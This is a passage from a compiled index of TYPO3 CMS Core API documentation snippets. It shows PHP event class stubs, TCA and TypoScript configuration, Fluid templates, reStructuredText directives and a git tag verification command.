EXT:some_extension/Classes/Middleware/ExampleMiddleware.php\n```\n\n----------------------------------------\n\nTITLE: TSConfig for Multiple Page Storage\nDESCRIPTION: TypoScript configuration for setting multiple page storage IDs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_7\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEFORM.tt_content.myextension_reference.PAGE_TSCONFIG_IDLIST = 42,27\n```\n\n----------------------------------------\n\nTITLE: Accessing Link Resolution Hook in TYPO3 v12 and v13\nDESCRIPTION: Example showing how to access the link resolution hook for backward compatibility between TYPO3 v12 and v13. When implementing both the hook and event listener, you can maintain compatibility with both versions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/Events.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['Link']['resolveByStringRepresentation']\n```\n\n----------------------------------------\n\nTITLE: Handling Arguments and Options in Command Execution\nDESCRIPTION: Example of retrieving command arguments and options in the execute() method using InputInterface methods getArgument() and getOption().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Executes the command\n */\nprotected function execute(InputInterface $input, OutputInterface $output): int\n{\n    $io = new SymfonyStyle($input, $output);\n    $wizardName = $input->getArgument('wizardName');\n    $isBoring = $input->getOption('boring');\n\n    if ($wizardName) {\n        $io->writeln('Wizard name is: ' . $wizardName);\n    } else {\n        $io->writeln('No wizard name provided');\n    }\n\n    if ($isBoring) {\n        $io->writeln('This is a boring wizard');\n    } else {\n        $io->writeln('This is a fancy wizard');\n    }\n\n    return Command::SUCCESS;\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying TYPO3 Admin Tools Screenshot with reStructuredText\nDESCRIPTION: A reStructuredText directive that includes and formats a screenshot showing the Admin Tools menu section. The directive includes metadata about automatic generation and adds a shadow effect to the image.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AdminTools/EditorAdminPrivileges.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. =========================================================\n.. Automatically generated by the TYPO3 Screenshots project.\n.. https://github.com/TYPO3-Documentation/t3docs-screenshots\n.. =========================================================\n\n.. figure:: /Images/AutomaticScreenshots/AdminTools/EditorAdminPrivileges.png\n   :class: with-shadow\n\n   Screenshot of a menu with the section \"Admin Tools\"\n```\n\n----------------------------------------\n\nTITLE: Defining AfterRawPageRowPreparedEvent Class in TYPO3 CMS Backend\nDESCRIPTION: This snippet defines the AfterRawPageRowPreparedEvent class in the TYPO3\\CMS\\Backend\\Tree\\Repository namespace. The class provides methods to get and set raw page data and retrieve the workspace ID.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/AfterRawPageRowPreparedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Tree\\Repository;\n\nclass AfterRawPageRowPreparedEvent\n{\n    public function getRawPage(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setRawPage(array $rawPage): void\n    {\n        // Implementation not shown\n    }\n\n    public function getWorkspaceId(): int\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using the 'if' method in ExpressionBuilder for conditional database expressions in TYPO3\nDESCRIPTION: The 'if' method in ExpressionBuilder creates SQL IF expressions for conditional database queries. It accepts a condition, true and false result expressions, and an optional alias. Returns a properly formatted SQL IF statement.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderIf.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nif(TYPO3\\CMS\\Core\\Database\\Query\\Expression\\CompositeExpression|Doctrine\\DBAL\\Query\\Expression\\CompositeExpression|Stringable|string $condition, Stringable|string $truePart, Stringable|string $falsePart, ?Stringable|string|null $as = NULL)\n```\n\n----------------------------------------\n\nTITLE: Implementing TeaController Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the TeaController class, which extends ActionController. It includes a constructor for dependency injection of TeaRepository and an indexAction method to retrieve and display all teas.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/_Controller/_IndexAction.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TTN\\Tea\\Domain\\Repository\\Product\\TeaRepository;\n\nclass TeaController extends ActionController\n{\n    private TeaRepository $teaRepository;\n\n    public function __construct(TeaRepository $teaRepository)\n    {\n        $this->teaRepository = $teaRepository;\n    }\n\n    public function indexAction(): ResponseInterface\n    {\n        $this->view->assign('teas', $this->teaRepository->findAll());\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: File Extension to MIME Type Mapping\nDESCRIPTION: Default configuration for mapping file extensions to MIME types in TYPO3, used when automatic detection needs to be overridden.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['FileInfo']['fileExtensionToMimeType'] = [\n    'fileExtensionToMimeType' => [\n        'svg' => 'image/svg+xml',\n        'youtube' => 'video/youtube',\n        'vimeo' => 'video/vimeo',\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition for RTE HTML Parser Event\nDESCRIPTION: Class definition for AfterTransformTextForRichTextEditorEvent that handles events after RteHtmlParser modifies HTML content from database to RTE editor format. The class includes methods for getting and setting HTML content and processing configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Html/AfterTransformTextForRichTextEditorEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Html\\Event;\n\nclass AfterTransformTextForRichTextEditorEvent {\n    public function getHtmlContent(): string;\n    public function setHtmlContent(string $htmlContent): void;\n    public function getInitialHtmlContent(): string;\n    public function getProcessingConfiguration(): array;\n}\n```\n\n----------------------------------------\n\nTITLE: Class Constant Naming in PHP\nDESCRIPTION: Provides an example of a well-named class constant in PHP, stressing clarity and descriptiveness.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\nconst USERLEVEL_MEMBER = 1;\n```\n\n----------------------------------------\n\nTITLE: Rendering Crop Variants with TYPO3 Fluid ViewHelper\nDESCRIPTION: Example of using the f:image ViewHelper to render a specific crop variant with width specification.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CropVariants/General/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<f:image image=\"{data.image}\" cropVariant=\"mobile\" width=\"800\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring TCA Column Control Properties in TYPO3\nDESCRIPTION: Various TCA 'ctrl' configuration options that define database field names and their purposes for TYPO3 tables, including frontend group access, sorting, descriptions, edit locking, language handling, versioning, and translation features.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTablesSql.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['enablecolumns']['fe_group'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['sortby'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['descriptionColumn'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['editlock'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['languageField'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['transOrigPointerField'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['translationSource'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['origUid'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['transOrigDiffSourceField'] = 'my_field_name'\n```\n\nLANGUAGE: php\nCODE:\n```\n['ctrl']['versioningWS'] = true\n```\n\n----------------------------------------\n\nTITLE: RST Figure Directive for TYPO3 Category Screenshot\nDESCRIPTION: RST markup for embedding and styling a screenshot that shows a category relation field in the TYPO3 backend. The image includes a shadow effect class for visual enhancement.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Categories/AddingWithApi.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Categories/AddingWithApi.png\n   :class: with-shadow\n\n   The newly added field to define relations to categories\n```\n\n----------------------------------------\n\nTITLE: PHP Class Method Definitions for TYPO3 DownloadPreset\nDESCRIPTION: Defines the core methods for the DownloadPreset class including getters for identifier, label, columns and a factory create method. This class is part of TYPO3's backend record list functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/DownloadPreset.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\RecordList;\n\nclass DownloadPreset\n{\n    public function getIdentifier(): string\n    {\n    }\n\n    public function getLabel(): string\n    {\n    }\n\n    public function getColumns(): array\n    {\n    }\n\n    public function create(array $preset): self\n    {\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Including External File in reStructuredText\nDESCRIPTION: This snippet includes an external file named 'Includes.rst.txt' in the reStructuredText document. It's a common practice in TYPO3 documentation to include shared content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/HistoricalRteTransformations/PropertiesAndTransformations.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. include:: /Includes.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Defining SiteConfigurationLoadedEvent Class Methods in PHP\nDESCRIPTION: Documents the SiteConfigurationLoadedEvent class methods for handling site configurations in TYPO3. The class provides methods to get the site identifier, retrieve the current configuration, and set new configuration values before caching.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/SiteConfigurationLoadedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Configuration\\Event;\n\nclass SiteConfigurationLoadedEvent {\n    public function getSiteIdentifier(): string;\n    public function getConfiguration(): array;\n    public function setConfiguration(array $configuration);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Format Responses in TYPO3 Extbase\nDESCRIPTION: This snippet details how to create response objects using the ResponseFactory implementing the ResponseFactoryInterface in TYPO3 Extbase for custom formats other than HTML or JSON. It requires assembling a response object through proper interface implementations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/View/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n\\include:: /CodeSnippets/Extbase/View/CustomResponse.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileMarkedAsMissingEvent Class in TYPO3 CMS Core Resource\nDESCRIPTION: This snippet defines the AfterFileMarkedAsMissingEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class is triggered when a file is marked as missing in the sys_file table of the database. It provides a method to retrieve the UID of the affected file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileMarkedAsMissingEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileMarkedAsMissingEvent\n{\n    public function getFileUid(): int\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing TYPO3 Backend Controller in PHP\nDESCRIPTION: This snippet defines a BackendController class for TYPO3 CMS, extending the ActionController. It includes an initializeAction method that sets the pageUid property from the 'id' query parameter, defaulting to 0 if not present.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Controllers/BackendControllerInitialize.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass BackendController extends ActionController\n{\n    protected function initializeAction(): void\n    {\n        $this->pageUid = (int)($this->request->getQueryParams()['id'] ?? 0);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining PasswordHasBeenResetEvent Class in TYPO3 CMS Backend Authentication\nDESCRIPTION: This snippet defines the PasswordHasBeenResetEvent class in the TYPO3\\CMS\\Backend\\Authentication\\Event namespace. It includes a public readonly attribute userId, which likely stores the ID of the user whose password has been reset.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/PasswordHasBeenResetEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Authentication\\Event;\n\nclass PasswordHasBeenResetEvent\n{\n    public readonly $userId;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing PSR-15 Middleware for Status Check in TYPO3\nDESCRIPTION: This code snippet demonstrates a middleware that creates a JSON response using PSR-17 response factory when a certain condition is met. It uses dependency injection to get the response factory implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Middlewares.rst#2025-04-16_snippet_6\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _Middlewares/_StatusCheckMiddleware.php\n   :caption: EXT:some_extension/Classes/Middleware/StatusCheckMiddleware.php\n```\n\n----------------------------------------\n\nTITLE: Retrieving Registry Entries in TYPO3 CMS (PHP)\nDESCRIPTION: The get() method retrieves a persistent entry from the registry. It takes a namespace (usually an extension key), a key, and an optional default value. It returns the value of the entry or the default value if the entry doesn't exist.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Registry/Registry.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nget(?string $namespace, ?string $key, ?mixed $defaultValue = NULL)\n```\n\n----------------------------------------\n\nTITLE: Including Administrator Creation Form Screenshot in reStructuredText\nDESCRIPTION: reStructuredText directive for including a screenshot of the TYPO3 CMS administrator creation form with caption and styling\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/BackendUsers/CreateAdministratorForm.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/BackendUsers/CreateAdministratorForm.png\n   :alt: Form to create an administrator\n   :class: with-shadow\n\n   Fill in the fields for the new administrative user\n```\n\n----------------------------------------\n\nTITLE: ModifyTypoScriptConfigEvent Class Method Definitions\nDESCRIPTION: Class methods for interacting with TypoScript configuration in TYPO3 CMS. Includes methods to get the server request, setup tree, config tree, and set a new config tree. The event allows modification of TypoScript config before caching.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/ModifyTypoScriptConfigEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getRequest()\n:returns: `\\Psr\\Http\\Message\\ServerRequestInterface`\n```\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getSetupTree()\n:returns: `\\TYPO3\\CMS\\Core\\TypoScript\\AST\\Node\\RootNode`\n```\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getConfigTree()\n:returns: `\\TYPO3\\CMS\\Core\\TypoScript\\AST\\Node\\RootNode`\n```\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: setConfigTree(\\TYPO3\\CMS\\Core\\TypoScript\\AST\\Node\\RootNode $configTree)\n:param $configTree: the configTree\n```\n\n----------------------------------------\n\nTITLE: Defining AfterResourceStorageInitializationEvent Class in PHP for TYPO3 CMS Core Resource\nDESCRIPTION: This snippet defines the AfterResourceStorageInitializationEvent class within the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class is used after a resource object is built/created and allows for custom handler initialization.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterResourceStorageInitializationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterResourceStorageInitializationEvent\n{\n    public function getStorage(): \\TYPO3\\CMS\\Core\\Resource\\ResourceStorage\n    {\n        // Implementation not shown\n    }\n\n    public function setStorage(\\TYPO3\\CMS\\Core\\Resource\\ResourceStorage $storage): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up RST documentation structure for ExtensionManager events\nDESCRIPTION: This RST code sets up the documentation structure for the ExtensionManager events page, including imports, indexing, and a table of contents that will include all available PSR-14 events.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/ExtensionManager/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; extension_manager\n..  _eventlist-backend-extension-manager:\n\n\n================\nExtensionManager\n================\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:extension_manager.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeJavaScriptsRenderingEvent Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the BeforeJavaScriptsRenderingEvent class in the TYPO3\\CMS\\Core\\Page\\Event namespace. The class provides methods to interact with JavaScript rendering process in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeJavaScriptsRenderingEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Page\\Event;\n\nclass BeforeJavaScriptsRenderingEvent\n{\n    public function getAssetCollector(): \\TYPO3\\CMS\\Core\\Page\\AssetCollector\n    {\n        // Implementation not shown\n    }\n\n    public function isInline(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function isPriority(): bool\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding the FlexForm Field to Content Element Configuration\nDESCRIPTION: Example showing how to add the FlexForm field to the showitem directive in TCA to make it appear in the backend form when editing the content element.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n// Configure element type\n$GLOBALS['TCA']['tt_content']['types']['accordion'] = array_replace_recursive(\n    $GLOBALS['TCA']['tt_content']['types']['accordion'],\n    [\n        'showitem' => '\n            --div--;General,\n            --palette--;General;general,\n            --palette--;Headers;headers,\n            tx_bootstrappackage_accordion_item,\n            --div--;Options,\n            pi_flexform'\n    ]\n);\n```\n\n----------------------------------------\n\nTITLE: Database Content Format Example in TYPO3 Hybrid Mode\nDESCRIPTION: Shows how content is stored in the database using a hybrid mode like css_transform, demonstrating links, bold text, and paragraph alignment in a human-readable format.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/Transformations/Introduction.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\nThis is line number 1 with a <a href=\"t3://page?uid=123\">link</a> inside\nThis is line number 2 with a <b>bold part</b> in the text\n<p align=\"center\">This line is centered.</p>\nThis line is just plain\n```\n\n----------------------------------------\n\nTITLE: Verifying Request Token in TYPO3 Process Controller\nDESCRIPTION: This snippet demonstrates how to verify a request token in a processing controller action. It checks if the token is valid for the expected scope before processing the form data, providing protection against CSRF attacks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/AuthenticationService/CSRFlikeRequestTokenHandling.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n..  literalinclude:: _CSRFlikeRequestTokenHandling/_MyProcessController.php\n        :caption: EXT:my_extension/Classes/Controller/MyController.php\n```\n\n----------------------------------------\n\nTITLE: Fluid Partial Location for Page Views (HTML)\nDESCRIPTION: Shows the common location for Fluid partials used by the page view in a site package.  These partials reside in the `/Resources/Private/PageView/Partials/` directory and are included via the `<f:render>` ViewHelper.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/PageView/Partials/SomePartials.html\"\n```\n\n----------------------------------------\n\nTITLE: Configuring RTE Node Resolver in TYPO3 Extension\nDESCRIPTION: Configuration code in ext_localconf.php that registers a custom RichTextNodeResolver with FormEngine to handle RTE integration. Sets priority higher than Core implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/InTheBackend/PlugRte.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['formEngine']['nodeResolver'][1480314091] = [\n    'nodeName' => 'text',\n    'priority' => 50,\n    'class' => \\MyVendor\\MyExtension\\Form\\Resolver\\RichTextNodeResolver::class,\n];\n```\n\n----------------------------------------\n\nTITLE: Defining RTE Transformation Filter: ts_links\nDESCRIPTION: Defines the ts_links filter which processes anchor tags and resolves them using TYPO3's LinkService before saving to the database, utilizing the TYPO3-internal t3:// syntax.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/Transformations/Overview.rst#2025-04-16_snippet_1\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. confval:: ts_links\n\n   :Scope: RTE Transformation filter\n\n   Processes anchor tags and resolves them via\n   :php:`\\TYPO3\\CMS\\Core\\LinkHandling\\LinkService` before saving them to\n   the database, while using the TYPO3-internal :html:`t3://` syntax.\n```\n\n----------------------------------------\n\nTITLE: Configuring Extension Manager Exclusion Patterns\nDESCRIPTION: Defines a list of directories and files to be excluded from extension packaging using a Perl-style regular expression. Useful for preventing unwanted files from being included in extension distributions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/EXT.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['EXT']['excludeForPackaging'] = '(?:\\.(?!htaccess$).*|.*~|.*\\.swp|.*\\.bak|node_modules|bower_components)'\n```\n\n----------------------------------------\n\nTITLE: Configuring Focus Area in TYPO3 CMS\nDESCRIPTION: Configuration for setting up a focus area that defines the essential visible portion of the image within the crop area.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CropVariants/General/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n'config' => [\n    'type' => 'imageManipulation',\n    'cropVariants' => [\n        'mobile' => [\n            'title' => 'LLL:EXT:ext_key/Resources/Private/Language/locallang.xlf:imageManipulation.mobile',\n            'focusArea' => [\n                'x' => 1 / 3,\n                'y' => 1 / 3,\n                'width' => 1 / 3,\n                'height' => 1 / 3,\n            ],\n        ],\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Using GravatarViewHelper with Tag Syntax (HTML)\nDESCRIPTION: Example of using the GravatarViewHelper with tag syntax in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_6\n\nLANGUAGE: HTML\nCODE:\n```\n<m:gravatar emailAddress=\"{post.author.emailAddress}\" />\n```\n\n----------------------------------------\n\nTITLE: Git Tag Signature Verification\nDESCRIPTION: Commands for verifying Git tag signatures in TYPO3 repository releases.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/ReleaseIntegrity.rst#2025-04-16_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ngit tag --verify v12.4.11\n```\n\nLANGUAGE: bash\nCODE:\n```\ngit show v12.4.11\n```\n\n----------------------------------------\n\nTITLE: RST Figure Directive for MFA QR Code Screenshot\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of the TYPO3 MFA TOTP provider configuration screen with added shadow styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Authentication/MfaQrCode.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Authentication/MfaQrCode.png\n   :class: with-shadow\n\n   MFA TOTP provider configuration screen\n```\n\n----------------------------------------\n\nTITLE: RST Table of Contents for TYPO3 Localization\nDESCRIPTION: ReStructuredText markup defining the documentation structure for TYPO3 localization, including index entries and section references.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index::\n   ! Localization\n   see: Localization; Localization\n.. _locallang:\n.. _locallang-elements:\n.. _locallang-elements-nesting:\n.. _locallang-elements-value:\n.. _locallang-ext:\n.. _locallang-example-backend:\n.. _internationalization:\n\n.. _localization:\n\n============\nLocalization\n============\n\n..  toctree::\n    :titlesonly:\n\n    Introduction\n    Languages\n    ManagingTranslations\n    TranslationServer/Index\n    LocalizationApi/Index\n    XliffFormat\n    XliffApi\n```\n\n----------------------------------------\n\nTITLE: Implementing getAction Method in PHP\nDESCRIPTION: This method retrieves an action by its name. If the action exists in both groups and no group is specified, it returns the action from the 'primary' group.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\npublic function getAction(string $actionName, string $group = ''): ?string\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Typotags in reStructuredText\nDESCRIPTION: This snippet lists the default typotags used in TYPO3 for special content formatting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/HistoricalRteTransformations/RteTransformationsInContentElements.rst#2025-04-16_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\nThe default typotags tags are :code:`<LINK>` (making links),\n:code:`<TYPOLIST>` (making bulletlists), :code:`<TYPOHEAD>` (making headlines) and\n:code:`<TYPOCODE>` (making monospaced formatting).\n```\n\n----------------------------------------\n\nTITLE: Adding a Single Cache Tag in TYPO3 CMS (PHP)\nDESCRIPTION: This code demonstrates how to add a single cache tag to the frontend cache collector. It retrieves the cache collector from the request attributes and adds a new cache tag for a custom extension table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendCacheCollector.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Cache\\CacheTag;\n\n$cacheDataCollector = $request->getAttribute('frontend.cache.collector');\n$cacheDataCollector->addCacheTags(\n    new CacheTag('tx_myextension_mytable'),\n);\n```\n\n----------------------------------------\n\nTITLE: Defining Post Model Class with Comments Property in PHP\nDESCRIPTION: This code defines the Post class which extends AbstractEntity. It includes a public property 'comments' of type ObjectStorage to store Comment objects. The class uses the TYPO3 Extbase framework's ObjectStorage.\nSOURCE: 